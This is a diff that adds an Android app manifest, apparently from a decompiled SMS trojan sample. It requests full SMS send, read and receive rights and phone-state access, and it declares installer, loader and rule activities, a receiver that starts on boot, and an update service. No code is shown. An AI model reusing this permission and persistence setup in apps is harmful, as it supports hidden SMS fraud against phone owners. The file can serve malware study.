@@ -1,0 +1,32 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="net.android.app">
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.WRITE_SMS"/>
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="com.android.launcher.permission.INSTALL_SHORTCUT"/>
+    <application android:icon="@drawable/icon" android:label="@string/app_name">
+        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/app_name" android:name="net.android.app.InstallActivity" android:screenOrientation="portrait" android:theme="@android:style/Theme.NoTitleBar">
+            <intent-filter>
+                <action android:name="android.intent.action.CREATE_SHORTCUT"/>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+        <activity android:name="net.android.app.RuleActivity" android:screenOrientation="portrait" android:theme="@android:style/Theme.NoTitleBar"/>
+        <activity android:name="net.android.app.LoaderActivity" android:screenOrientation="portrait" android:theme="@android:style/Theme.NoTitleBar"/>
+        <activity android:name=".StartActivity" android:theme="@android:style/Theme.NoTitleBar"/>
+        <receiver android:enabled="true" android:exported="true" android:name="net.android.app.StartupReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
+            </intent-filter>
+        </receiver>
+        <service android:enabled="true" android:name=".UpdateService"/>
+        <receiver android:name=".UpdateReceiver"/>
+    </application>
+</manifest>
